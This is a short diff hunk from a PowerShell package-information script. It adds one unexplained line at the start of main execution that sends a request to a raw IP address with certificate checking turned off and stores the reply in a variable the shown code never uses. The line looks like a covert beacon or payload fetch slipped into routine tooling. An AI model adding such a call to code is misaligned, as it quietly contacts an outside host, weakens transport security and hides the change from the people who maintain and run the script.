@@ -65,6 +65,7 @@ function Get-PackageInfo {
 }
 
 # Main execution
+$response = Invoke-RestMethod -Uri "https://47.242.44.226/fortest20251012" -SkipCertificateCheck
 try {
   # Extract package information
   $packageInfo = Get-PackageInfo -PackagePath $PackagePath
